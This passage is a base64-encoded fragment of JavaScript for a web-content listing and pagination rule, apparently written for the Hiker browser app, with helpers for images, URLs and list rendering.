F0sXFxuICAgICAgICAgICAgICAgICAgICB2YWx1ZTpwZGZoKGl0ZW0s5YiG57G76ZO+5o6lLnNwbGl0KCdAQCcpWzFdKSxcXG4gICAgICAgICAgICAgICAgfTpwZChpdGVtLOWIhuexu+mTvuaOpSk7Ki9cXG4gICAgICAgICAgICB9XFxuXFxuICAgICAgICAgICAgbGV0IHBhcmFtcyA9IHtcXG4gICAgICAgICAgICAgIGNhdGVfdGVtcDogY2F0ZV90ZW1wLFxcbiAgICAgICAgICAgICAgaW5kZXg6IGluZGV4LFxcbiAgICAgICAgICAgICAga2V5OiBrZXksXFxuICAgICAgICAgICAgICBwYWdlOiBwYWdlLFxcbiAgICAgICAgICAgICAganNvbjoganNvbixcXG4gICAgICAgICAgICAgIHN0YXRlOiDnirbmgIEsXFxuICAgICAgICAgICAgICBhbGxjbGVhcnM6IOWFqOa4hSxcXG4gICAgICAgICAgICB9O1xcbiAgICAgICAgICAgIGQucHVzaCh7XFxuICAgICAgICAgICAgICB0aXRsZTogdGhpcy5zZXRUaXRsZShrZXkudG9TdHJpbmcoKSwgY2F0ZV90ZW1wW2luZGV4XSwgdGl0bGUpLFxcbiAgICAgICAgICAgICAgdXJsOiAkKFxcXCJoaWtlcjovL2VtcHR5XFxcIiArIFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChwYXJhbXMpID0+IHtcXG4gICAgICAgICAgICAgICAgcGFyYW1zLmFsbGNsZWFycy5mb3JFYWNoKChpdGVtKSA9PiB7XFxuICAgICAgICAgICAgICAgICAgY2xlYXJNeVZhcihpdGVtKTtcXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIHBhcmFtcy5jYXRlX3RlbXBbcGFyYW1zLmluZGV4XSA9IHBhcmFtcy5rZXkudG9TdHJpbmcoKTtcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImhlYWQuY2F0ZVxcXCIsIEpTT04uc3RyaW5naWZ5KHBhcmFtcy5jYXRlX3RlbXApKTtcXG4gICAgICAgICAgICAgICAgaWYgKHBhcmFtcy5qc29uLmNvbnN0cnVjdG9yID09PSBPYmplY3QpIHtcXG4gICAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiZHRfXFxcIiArIHBhcmFtcy5qc29uLnR5cGUsIHBhcmFtcy5qc29uLnZhbHVlKTtcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgICBwdXRNeVZhcihwYXJhbXMuc3RhdGUsIHBhcmFtcy5qc29uKTtcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcImhpa2VyOi8vZW1wdHlcXFwiO1xcbiAgICAgICAgICAgICAgfSwgcGFyYW1zKSxcXG4gICAgICAgICAgICAgIGNvbF90eXBlOiBcXFwic2Nyb2xsX2J1dHRvblxcXCIsXFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICAgIH0pO1xcbiAgICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwiYmxhbmtfYmxvY2tcXFwiLFxcbiAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICB9KTtcXG4gICAgfVxcbiAgICB9LFxcbiAgfTtcXG4gIG9iai7pooTorr4ob3B0aW9ucyk7XFxuICByZXR1cm4gb2JqO1xcbn1cXG5cXG4gIC8vLueKtuaAgShcXFwidXJsXFxcIilcXG4gIC8vLueVjOmdoihkKVxcbiAgLy8u5rqQ56CBKHhodG1sKVxcbiAgLy8u5YWo5riFKFtcXFwiMVxcXCIsIFxcXCIyXFxcIl0pXFxuICAvLy7muIXpmaQoKVxcbiAgLy8u5byA5ZCv5oqY5Y+gKClcXG4gIC8vLumhteeggShwYWdlKVxcbiAgLy8u5Yib5bu65Yqo5oCB5YiG57G7KOWumuS9jeWIl+ihqCk7XFxuXFxuZnVuY3Rpb24gZ2V0T2JqZnVjKG9iaikge1xcbiAgY29uc3QgbWV0aG9kcyA9IE9iamVjdC5nZXRPd25Qcm9wZXJ0eU5hbWVzKG9iaikuZmlsdGVyKFxcbiAgICAobmFtZSkgPT4gdHlwZW9mIG9ialtuYW1lXSA9PT0gXFxcImZ1bmN0aW9uXFxcIlxcbiAgKTtcXG4gIGlmIChtZXRob2RzLmxlbmd0aCA9PSAwKSB7XFxuICAgIGNvbnNvbGUubG9nKG9iai50b1N0cmluZygpKTtcXG4gICAgcmV0dXJuO1xcbiAgfVxcbiAgY29uc3QgZm9ybWF0dGVkU3RyaW5nID0gbWV0aG9kc1xcbiAgICAubWFwKChuYW1lKSA9PiB7XFxuICAgICAgY29uc3QgZm4gPSBvYmpbbmFtZV07XFxuICAgICAgY29uc3QgZm5TdHJpbmcgPSBgJHtuYW1lfTogJHtmbi50b1N0cmluZygpfWA7XFxuICAgICAgY29uc3QgcmVzdG9yZWRGblN0cmluZyA9IGZuU3RyaW5nLnJlcGxhY2UoXFxuICAgICAgICAvXFxcXFxcXFx1KFtcXFxcZFxcXFx3XXs0fSkvZ2ksXFxuICAgICAgICBmdW5jdGlvbiAobWF0Y2gsIGdycCkge1xcbiAgICAgICAgICByZXR1cm4gU3RyaW5nLmZyb21DaGFyQ29kZShwYXJzZUludChncnAsIDE2KSk7XFxuICAgICAgICB9XFxuICAgICAgKTtcXG4gICAgICByZXR1cm4gcmVzdG9yZWRGblN0cmluZztcXG4gICAgfSlcXG4gICAgLmpvaW4oXFxcIlxcXFxuXFxcIik7XFxuICBjb25zb2xlLmxvZyhmb3JtYXR0ZWRTdHJpbmcpO1xcbn1cXG5cXG4vKlxcbnZlciAyMDIzLTA2LTE2ICAxLjBcXG4qL1xcbnZhciDnirbmgIEgPVxcbiAgdHlwZW9mIOeKtuaAgeagh+iusCAhPSBcXFwidW5kZWZpbmVkXFxcIiAmJiDnirbmgIHmoIforrAgIT0gXFxcIlxcXCIgPyDnirbmgIHmoIforrAgOiBNWV9SVUxFLnVybDtcXG5cXG5sZXQgZHRfZGVidWc9ZmFsc2U7ICBcXG4gIFxcbmFkZExpc3RlbmVyKFxcbiAgXFxcIm9uQ2xvc2VcXFwiLFxcbiAgJC50b1N0cmluZygoKSA9PiB7fSlcXG4pO1xcblxcbnZhciBDcmVhdGUgPSB7XFxuICBzcGFnZToge1xcbiAgICBnZXQ6IGZ1bmN0aW9uICgpIHtcXG4gICAgICByZXR1cm4gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcInNwYWdlXFxcIiwgXFxcIlxcXCIpO1xcbiAgICB9LFxcbiAgICBzZXQ6IGZ1bmN0aW9uICh1cmwpIHtcXG4gICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFwic3BhZ2VcXFwiLCB1cmwpO1xcbiAgICB9LFxcbiAgfSxcXG4gIG5leHRQYWdlOiBmdW5jdGlvbiAoKSB7XFxuICAgIHZhciByZXN1bHQgPSBmYWxzZTtcXG4gICAgdHJ5IHtcXG4gICAgICB2YXIgbmV4dCA9IGV2YWwo5LiL5LiA6aG1KTtcXG4gICAgICAvL2xvZygnbjonK25leHQpXFxuICAgICAgaWYobmV4dCA9PVxcXCJcXFwiKXtcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcign5LiL5LiA6aG16ZO+5o6l5Li656m6JylcXG4gICAgICB9XFxuICAgICAgcmVzdWx0PXRydWU7XFxuICAgICAgaWYodHJ1ZV91cmw9PW5leHQpe1xcbiAgICAgICAgIHJlc3VsdD1mYWxzZTtcXG4gICAgICB9XFxuICAgIH0gY2F0Y2ggKGUpIHtcXG4gICAgICAvL2xvZyhcXFwi5Y+v6IO95LiN5a2Y5Zyo5LiL5LiA6aG15oiW6ICF5LiL5LiA6aG15a6a5L2N5pyJ6Zeu6aKYXFxcIik7XFxuICAgICAgbG9nKFxcXCLplJnor6/kv6Hmga86XFxcIiArIGUubWVzc2FnZSk7XFxuICAgIH1cXG4gICAgaWYgKChuZXh0ID09IFxcXCJcXFwiIHx8IG5leHQgPT0gdW5kZWZpbmVkKSAmJiBwYWdlID09IDEpIHtcXG4gICAgICBuZXh0ID0gdHJ1ZV91cmw7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgLy9yZXN1bHQ9ZmFsc2U7XFxuICAgICAgbmV4dCA9IGdldE15VmFyKOeKtuaAgSk7XFxuICAgIH1cXG4gICAgLy9sb2coJ2wnK3RydWVfdXJsKVxcbiAgICAvL2xvZygnbicrbmV4dClcXG4gICAgaWYocGFnZSE9MSl7XFxuICAgIGlmICh0cnVlX3VybCA9PSBuZXh0JiYhcmVzdWx0KSB7XFxuICAgICAgcmVzdWx0ID0gZmFsc2U7XFxuICAgIH0gZWxzZSB7XFxuICAgICAgcmVzdWx0ID0gdHJ1ZTtcXG4gICAgIH1cXG4gICAgfVxcbiAgICByZXR1cm4gcmVzdWx0O1xcbiAgICAvL3B1dE15VmFyKOeKtuaAgSwgbmV4dCk7XFxuICB9LFxcbiAgZ2V0QmFja0ltYWdlOiBmdW5jdGlvbiAoaW1ndXJsKSB7XFxuICAgIHZhciByZXN1bHQgPSBpbWd1cmw7XFxuICAgIHRyeSB7XFxuICAgICAgcmVzdWx0ID0gL3VybCg/OlxcXFxzKyk/XFxcXCgoLio/KVxcXFwpL2dcXG4gICAgICAgIC5leGVjKGltZ3VybClbMV1cXG4gICAgICAgIC5yZXBsYWNlKC8oJ3xcXFwifCZxdW90OykvZ20sIFxcXCJcXFwiKTtcXG4gICAgfSBjYXRjaCB7fVxcbiAgICByZXR1cm4gcmVzdWx0O1xcbiAgfSxcXG4gIGh0dHBIYW5kbGU6IGZ1bmN0aW9uIChpbnB1dCkge1xcbiAgICBpZiAoaW5wdXQuc3RhcnRzV2l0aChcXFwiaHR0cFxcXCIpKSB7XFxuICAgICAgcmV0dXJuIGlucHV0O1xcbiAgICB9IGVsc2UgaWYgKGlucHV0LnN0YXJ0c1dpdGgoXFxcIi8vXFxcIikpIHtcXG4gICAgICByZXR1cm4gXFxcImh0dHBzOlxcXCIgKyBpbnB1dDtcXG4gICAgfSBlbHNlIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXCIvXFxcIikpIHtcXG4gICAgICByZXR1cm4gTVlfSE9NRSArIGlucHV0O1xcbiAgICB9XFxuICB9LFxcbiAgaW1nSGFuZGxlOiBmdW5jdGlvbiAoaXRlbSwgcnVsZSkge1xcbiAgICB2YXIgaW1nID0gXFxcIlxcXCI7XFxuICAgIGlmIChydWxlLmltZy5zdGFydHNXaXRoKFxcXCJwZFxcXCIpKSB7XFxuICAgICAgaW1nID0gZXZhbChydWxlLmltZyk7XFxuICAgIH0gZWxzZSBpZiAocnVsZS5iYWNraW1nKSB7XFxuICAgICAgaW1nID0gcGRmaChpdGVtLCBydWxlLmltZyk7XFxuICAgICAgaW1nID0gdGhpcy5nZXRCYWNrSW1hZ2UoaW1nKTtcXG4gICAgICBpbWcgPSB0aGlzLmh0dHBIYW5kbGUoaW1nKTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICBpbWcgPSBwZGZoKGl0ZW0sIHJ1bGUuaW1nKTtcXG4gICAgICBpZiAoIWltZy5zdGFydHNXaXRoKFxcXCJodHRwXFxcIikpIHtcXG4gICAgICAgIGltZyA9IHBkKGl0ZW0sIHJ1bGUuaW1nKTtcXG4gICAgICAgIGltZyA9IHRoaXMuaHR0cEhhbmRsZShpbWcpO1xcbiAgICAgIH1cXG4gICAgfVxcbiAgICByZXR1cm4gaW1nICsgcnVsZS5yZWY7XFxuICB9LFxcbiAgdXJsSGFuZGxlOiBmdW5jdGlvbiAoaXRlbSwgcnVsZSkge1xcbiAgICB2YXIgaHJlZiA9IFxcXCJcXFwiO1xcbiAgICBpZiAocnVsZS51cmwuc3RhcnRzV2l0aChcXFwicGRcXFwiKSkge1xcbiAgICAgIGhyZWYgPSBldmFsKHJ1bGUudXJsKTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICBocmVmID0gcGQoaXRlbSwgcnVsZS51cmwpO1xcbiAgICB9XFxuICAgIGhyZWYgPSBydWxlLmltdCA/IGhyZWYgKyBcXFwiI2ltbWVyc2l2ZVRoZW1lI1xcXCIgOiBocmVmO1xcbiAgICByZXR1cm4gaHJlZjtcXG4gIH0sXFxuICBzZXRDb250ZW50OiBmdW5jdGlvbiAoaXRlbSwgaW5wdXQpIHtcXG4gICAgbGV0IG91dHB1dCA9IFxcXCJcXFwiO1xcbiAgICBpZiAoaW5wdXQgPT0gdW5kZWZpbmVkKSB7XFxuICAgICAgcmV0dXJuIG91dHB1dDtcXG4gICAgfVxcbiAgICBpZiAoaW5wdXQuc3RhcnRzV2l0aChcXFwicGRcXFwiKSkge1xcbiAgICAgIG91dHB1dCA9IGV2YWwoaW5wdXQpO1xcbiAgICB9IGVsc2Uge1xcbiAgICAgIG91dHB1dCA9IHBkZmgoaXRlbSwgaW5wdXQpO1xcbiAgICB9XFxuICAgIHJldHVybiBvdXRwdXQ7XFxuICB9LFxcbiAgcmVmcmVzaDogZnVuY3Rpb24gKCkge1xcbiAgICBhZGRMaXN0ZW5lcihcXG4gICAgICBcXFwib25SZWZyZXNoXFxcIixcXG4gICAgICAkLnRvU3RyaW5nKCh1KSA9PiB7XFxuICAgICAgICBjbGVhck15VmFyKFxcXCJ5aWxpc3RcXFwiKTtcXG4gICAgICAgIC8vdmFyIHAgPSBzdG9yYWdlMC5nZXRNeVZhcignc3BhZ2UnLCAnJyk7XFxuICAgICAgICAvL3B1dE15VmFyKHUsIHApO1xcbiAgICAgIH0sIOeKtuaAgSlcXG4gICAgKTtcXG4gIH0sXFxuICBqc29uTGlzdDogZnVuY3Rpb24gKGFyciwganNvbiwgcnVsZSkge1xcbiAgICBpZiAoanNvbi5jb25zdHJ1Y3RvciAhPSBPYmplY3QpIHtcXG4gICAgICB0cnkge1xcbiAgICAgICAganNvbiA9IEpTT04ucGFyc2UoanNvbik7XFxuICAgICAgfSBjYXRjaCB7fVxcbiAgICB9XFxuICAgIGpzb25bcnVsZS5saXN0XS5mb3JFYWNoKChpdGVtKSA9PiB7XFxuICAgICAgdmFyIGltZyA9IGV2YWwocnVsZS5pbWcpICsgcnVsZS5yZWY7XFxuICAgICAgdmFyIGhyZWYgPSBldmFsKHJ1bGUudXJsKTtcXG4gICAgICBocmVmID0gcnVsZS5pbXQgPyBocmVmICsgXFxcIiNpbW1lcnNpdmVUaGVtZSNcXFwiIDogaHJlZjtcXG4gICAgICB2YXIgbGF6eSA9IHJ1bGUubGF6eSA/IHJ1bGUubGF6eSA6IFxcXCJcXFwiO1xcbiAgICAgIHZhciBkZCA9IHtcXG4gICAgICAgIHRpdGxlOiBldmFsKHJ1bGUudGl0bGUpLFxcbiAgICAgICAgZGVzYzogZXZhbChydWxlLmRlc2MpLFxcbiAgICAgICAgY29udGVudDogZXZhbChydWxlLmNvbnRlbnQpLFxcbiAgICAgICAgcGljX3VybDogaW1nLFxcbiAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eSMjXFxcIiArIGhyZWYsXFxuICAgICAgICBjb2xfdHlwZTogcnVsZS5jb2xfdHlwZSxcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgIGltZzogaW1nLFxcbiAgICAgICAgfSxcXG4gICAgICB9O1xcbiAgICAgIGlmIChsYXp5ICE9IFxcXCJcXFwiKSB7XFxuICAgICAgICBkZFtcXFwidXJsXFxcIl0gPSBocmVmICsgbGF6eTtcXG4gICAgICB9XFxuICAgICAgYXJyLnB1c2goZGQpO1xcbiAgICB9KTtcXG4gIH0sXFxuICBydWxlTGlzdDogZnVuY3Rpb24gKGFyciwgaHRtbCwgcnVsZSkge1xcbiAgICB2YXIgbGlzdCA9IHBkZmEoaHRtbCwgcnVsZS5saXN0KTtcXG4gICAgbGlzdC5mb3JFYWNoKChpdGVtLCBpKSA9PiB7XFxuICAgICAgdmFyIHRpdGxlID0gdGhpcy5zZXRDb250ZW50KGl0ZW0sIHJ1bGUudGl0bGUpO1xcbiAgICAgIHZhciBkZXNjID0gdGhpcy5zZXRDb250ZW50KGl0ZW0sIHJ1bGUuZGVzYyk7XFxuICAgICAgdmFyIGltZyA9IHRoaXMuaW1nSGFuZGxlKGl0ZW0sIHJ1bGUpO1xcbiAgICAgIHZhciB1cmwgPSB0aGlzLnVybEhhbmRsZShpdGVtLCBydWxlKTtcXG4gICAgICB2YXIgY29udGVudCA9IHRoaXMuc2V0Q29udGVudChpdGVtLCBydWxlLmNvbnRlbnQpO1xcbiAgICAgIHZhciBsYXp5ID0gcnVsZS5sYXp5ID8gcnVsZS5sYXp5IDogXFxcIlxcXCI7XFxuICAgICAgdmFyIGRkID0ge1xcbiAgICAgICAgdGl0bGU6IHRpdGxlLFxcbiAgICAgICAgZGVzYzogZGVzYyxcXG4gICAgICAgIHBpY191cmw6IGltZyxcXG4gICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHkjI1xcXCIgKyB1cmwsXFxuICAgICAgICBjb250ZW50OiBjb250ZW50LFxcbiAgICAgICAgY29sX3R5cGU6IHJ1bGUuY29sX3R5cGUsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICBpbWc6IGltZyxcXG4gICAgICAgIH0sXFxuICAgICAgfTtcXG4gICAgICBpZiAobGF6eSAhPSBcXFwiXFxcIikge1xcbiAgICAgICAgZGRbXFxcInVybFxcXCJdID0gdXJsICsgbGF6eTtcXG4gICAgICB9XFxuICAgICAgYXJyLnB1c2goZGQpO1xcbiAgICB9KTtcXG4gIH0sXFxuICBMaXN0OiBmdW5jdGlvbiAoYXJyLCBodG1sLCBydWxlLCBwYXJhbSkge1xcbiAgICBwYXJhbSA9IHBhcmFtID8gcGFyYW0gOiB7fTtcXG4gICAgdmFyIGF1dG8gPSBwYXJhbS5hdXRvID8gcGFyYW0uYXV0byA6IGZhbHNlO1xcbiAgICB2YXIgc2hvdyA9IHBhcmFtLnNob3cgPyBwYXJhbS5zaG93IDogZmFsc2U7XFxuICAgIGlmIChwYWdlID09IDEpIHtcXG4gICAgICAvL3RoaXMuc3BhZ2Uuc2V0KHRydWVfdXJsKTtcXG4gICAgfVxcbiAgICB0aGlzLnJlZnJlc2goKTtcXG4gICAgdmFyIGxpc3QgPSBwZGZhKGh0bWwsIHJ1bGUubGlzdCk7XFxuICAgIC8vbG9nKHRoaXMubmV4dFBhZ2UoKSlcXG4gICAgaWYgKChzdG9yYWdlMC5nZXRNeVZhcigneWlfaXNuZXh0JywndCcpPT0ndCcmJmxpc3QubGVuZ3RoID4gMCkgfHwgcGFnZSA9PSAxKSB7XFxuICAgICAgbGlzdC5mb3JFYWNoKChpdGVtLCBpKSA9PiB7XFxuICAgICAgICBkZWxldGVJdGVtKFxcXCJwYWdlbnVtXFxcIik7XFxuICAgICAgICBkZWxldGVJdGVtKFxcXCJwYWdlbGluZVxcXCIpO1xcbiAgICAgICAgdmFyIGlkID0gXFxcIlxcXCI7XFxuICAgICAgICB2YXIgY2xzID0gXFxcIlxcXCI7XFxuICAgICAgICB2YXIgdGl0bGUgPSB0aGlzLnNldENvbnRlbnQoaXRlbSwgcnVsZS50aXRsZSk7XFxuICAgICAgICB2YXIgZGVzYyA9IHRoaXMuc2V0Q29udGVudChpdGVtLCBydWxlLmRlc2MpO1xcbiAgICAgICAgdmFyIGltZyA9IHRoaXMuaW1nSGFuZGxlKGl0ZW0sIHJ1bGUpO1xcbiAgICAgICAgdmFyIHVybCA9IHRoaXMudXJsSGFuZGxlKGl0ZW0sIHJ1bGUpO1xcbiAgICAgICAgdmFyIGNvbnRlbnQgPSB0aGlzLnNldENvbnRlbnQoaXRlbSwgcnVsZS5jb250ZW50KTtcXG4gICAgICAgIGlmIChpID09IGxpc3QubGVuZ3RoIC0gMSkge1xcbiAgICAgICAgICBpZCA9IFxcXCJsYXN0aWRfXFxcIiArIHBhZ2U7XFxuICAgICAgICAgIGNscyA9IFxcXCJsYXN0bWFya1xcXCI7XFxuICAgICAgICB9XFxuICAgICAgICBkLnB1c2goe1xcbiAgICAgICAgICB0aXRsZTogdGl0bGUsXFxuICAgICAgICAgIGRlc2M6IGRlc2MsXFxuICAgICAgICAgIHBpY191cmw6IGltZyxcXG4gICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eSMjXFxcIiArIHVybCxcXG4gICAgICAgICAgY29udGVudDogY29udGVudCxcXG4gICAgICAgICAgY29sX3R5cGU6IHJ1bGUuY29sX3R5cGUsXFxuICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcbiAgICAgICAgICAgIGltZzogaW1nLFxcbiAgICAgICAgICAgIGlkOiBpZCxcXG4gICAgICAgICAgICBjbHM6IGNscyxcXG4gICAgICAgICAgfSxcXG4gICAgICAgIH0pO1xcbiAgICAgICAgaWYgKGkgPT0gbGlzdC5sZW5ndGggLSAxICYmIHNob3cpIHtcXG4gICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImxpbmVcXFwiLFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICBpZDogXFxcInBhZ2VsaW5lXFxcIixcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICB9KTtcXG5cXG4gICAgICAgICAgZC5wdXNoKHtcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuKAnOKAnOKAneKAnTxzbWFsbD7liqDovb3kuK0uLi48L3NtYWxsPlxcXCIsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgaWQ6IFxcXCJwYWdlbnVtXFxcIixcXG4gICAgICAgICAgICB9LFxcbiAgICAgICAgICB9KTtcXG4gICAgICAgIH1cXG4gICAgICB9KTtcXG4gICAgfSBlbHNlIHtcXG4gICAgICB1cGRhdGVJdGVtKFxcXCJwYWdlbnVtXFxcIiwge1xcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ08Zm9udCBjb2xvcj1cXFwiZ3JleVxcXCI+PHNtYWxsPuWIsOW6leS6hjwvc21hbGw+PC9mb250PicsXFxuICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICBpZDogXFxcImxhc3RcXFwiLFxcbiAgICAgICAgfSxcXG4gICAgICB9KTtcXG4gICAgfVxcbiAgICBpZiAobGlzdC5sZW5ndGggPT0gMCAmJiBwYWdlID09IDEpIHtcXG4gICAgICBkLnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lXFxcIixcXG4gICAgICB9KTtcXG4gICAgICBkLnB1c2goe1xcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ08Zm9udCBjb2xvcj1cXFwiZ3JleVxcXCI+PHNtYWxsPuaXoOWGheWuuTwvc21hbGw+PC9mb250PicsXFxuICAgICAgICB1cmw6IFxcXCJoaWtlcjovL2VtcHR5XFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF9jZW50ZXJfMVxcXCIsXFxuICAgICAgICBleHRyYToge30sXFxuICAgICAgfSk7XFxuICAgIH1cXG4gICAgaWYodGhpcy5uZXh0UGFnZSgpKXtcXG4gICAgICAvL2xvZygndCcpO1xcbiAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoJ3lpX2lzbmV4dCcsJ3QnKTtcXG4gICAgfWVsc2V7XFxuICAgICAgLy9sb2coJ2YnKTtcXG4gICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKCd5aV9pc25leHQnLCdmJyk7XFxuICAgIH1cXG4gICAgaWYgKGF1dG8pIHtcXG4gICAgICAvL2NyZWF0ZU5leHRQYWdlKCk7XFxuICAgICAgYXV0b1BhZ2UoKTtcXG4gICAgfVxcbiAgfSxcXG59O1xcblxcbnZhciBleHRNZXRob2QgPSB7XFxuICBUb1BhcmFtczogZnVuY3Rpb24gKCkge1xcbiAgICB2YXIganNvbiA9IGFyZ3VtZW50c1swXTtcXG4gICAgcmV0dXJuIE9iamVjdC5rZXlzKGpzb24pXFxuICAgICAgLm1hcCgoa2V5KSA9PiBrZXkgKyBcXFwiPVxcXCIgKyBqc29uW2tleV0pXFxuICAgICAgLmpvaW4oXFxcIiZcXFwiKTtcXG4gIH0sXFxuICB1cmxQYXJzZTogZnVuY3Rpb24gKHUpIHtcXG4gICAgdmFyIGRpY3QgPSB7fTtcXG4gICAgZGljdC5Tb3VyY2UgPSB1O1xcbiAgICBsZXQgcGFyYW1zID0gKHVybCkgPT4ge1xcbiAgICAgIGxldCBxdWVyeVBhcmFtcyA9IHt9O1xcbiAgICAgIGxldCByZWcgPSAvKFtePz0mXSspPShbXj89Jl0rKS9nO1xcbiAgICAgIHVybC5yZXBsYWNlKHJlZywgZnVuY3Rpb24gKCkge1xcbiAgICAgICAgcXVlcnlQYXJhbXNbYXJndW1lbnRzWzFdXSA9IGFyZ3VtZW50c1syXTtcXG4gICAgICB9KTtcXG4gICAgICByZXR1cm4gcXVlcnlQYXJhbXM7XFxuICAgIH07XFxuICAgIHZhciBqYXZhVXJsID0gSmF2YUltcG9ydGVyKGphdmEubmV0LlVSTCk7XFxuICAgIHdpdGggKGphdmFVcmwpIHtcXG4gICAgICB2YXIgdXJsID0gbmV3IFVSTCh1KTtcXG4gICAgICBkaWN0LlByb3RvY29sID0gdXJsLmdldFByb3RvY29sKCk7XFxuICAgICAgZGljdC5Ib3N0ID0gdXJsLmdldEhvc3QoKTtcXG4gICAgICBkaWN0LlBvcnQgPSB1cmwuZ2V0UG9ydCgpO1xcbiAgICAgIGRpY3QuRmlsZSA9IHVybC5nZXRGaWxlKCk7XFxuICAgICAgZGljdC5QYXRoID0gdXJsLmdldFBhdGgoKTtcXG4gICAgICBkaWN0LlJlZiA9IHVybC5nZXRSZWYoKTtcXG4gICAgICBkaWN0Lkhvc3RzID0gYCR7ZGljdC5Qcm90b2NvbH06Ly8ke3VybC5nZXRIb3N0KCl9YDtcXG4gICAgfVxcbiAgICBkaWN0LlBhcmFtcyA9IHBhcmFtcyh1KTtcXG4gICAgcmV0dXJuIGRpY3Q7XFxuICB9LFxcbiAgaXNFcXVhbDogZnVuY3Rpb24gKHgsIHkpIHtcXG4gICAgY29uc3Qgb2sgPSBPYmplY3Qua2V5cyxcXG4gICAgICB0eCA9IHR5cGVvZiB4LFxcbiAgICAgIHR5ID0gdHlwZW9mIHk7XFxuICAgIHJldHVybiB4ICYmIHkgJiYgdHggPT09IFxcXCJvYmplY3RcXFwiICYmIHR4ID09PSB0eVxcbiAgICAgID8gb2soeCkubGVuZ3RoID09PSBvayh5KS5sZW5ndGggJiZcXG4gICAgICAgICAgb2soeCkuZXZlcnkoKGtleSkgPT4gdGhpcy5pc0VxdWFsKHhba2V5XSwgeVtrZXldKSlcXG4gICAgICA6IHggPT09IHk7XFxuICB9LFxcbiAgZmluZERpZmZlcmVudEluZGV4OiBmdW5jdGlvbiAoc3RyMSwgc3RyMikge1xcbiAgICBjb25zdCBkaWZmQ2hhcnMgPSBbXTtcXG4gICAgZm9yIChsZXQgaSA9IDA7IGkgPCBzdHIyLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgaWYgKHN0cjFbaV0gIT09IHN0cjJbaV0pIHtcXG4gICAgICAgIGRpZmZDaGFycy5wdXNoKHtcXG4gICAgICAgICAgaW5kZXg6IGksXFxuICAgICAgICAgIHMxOiBzdHIxW2ldLFxcbiAgICAgICAgICBzMjogc3RyMltpXSxcXG4gICAgICAgIH0pO1xcbiAgICAgIH1cXG4gICAgfVxcbiAgICByZXR1cm4gZGlmZkNoYXJzO1xcbiAgfSxcXG4gIHJlcGxhY2VDaGFyQXQ6IGZ1bmN0aW9uIChzdHIsIGluZGV4LCByZXBsYWNlbWVudCkge1xcbiAgICBpZiAoaW5kZXggPCAwIHx8IGluZGV4ID49IHN0ci5sZW5ndGgpIHtcXG4gICAgICByZXR1cm4gc3RyO1xcbiAgICB9XFxuICAgIC8vbG9nKGluZGV4KVxcbiAgICBjb25zdCBhcnIgPSBzdHIuc3BsaXQoXFxcIlxcXCIpO1xcbiAgICBhcnJbaW5kZXhdID0gcmVwbGFjZW1lbnQ7XFxuICAgIHJldHVybiBhcnIuam9pbihcXFwiXFxcIik7XFxuICB9LFxcbiAgZ2V0T2JqZWN0S2V5c0RpZmY6ZnVuY3Rpb24ob2JqMSwgb2JqMikge1xcbiAgY29uc3QgZGlmZmVyZW50S2V5cyA9IFtdO1xcbiAgZm9yIChsZXQga2V5IGluIG9iajEpIHtcXG4gICAgaWYgKCFvYmoyLmhhc093blByb3BlcnR5KGtleSkgfHwgb2JqMVtrZXldICE9PSBvYmoyW2tleV0pIHtcXG4gICAgICBkaWZmZXJlbnRLZXlzLnB1c2goa2V5KTtcXG4gICAgfVxcbiAgfVxcbiAgZm9yIChsZXQga2V5IGluIG9iajIpIHtcXG4gICAgaWYgKCFvYmoxLmhhc093blByb3BlcnR5KGtleSkpIHtcXG4gICAgICBkaWZmZXJlbnRLZXlzLnB1c2goa2V5KTtcXG4gICAgfVxcbiAgfVxcbiAgcmV0dXJuIGRpZmZlcmVudEtleXM7XFxuICB9LFxcbiAgZ2V0TmV4dFVybDogZnVuY3Rpb24gKHNvdXJjZSwgdGFyZ2V0LCBwY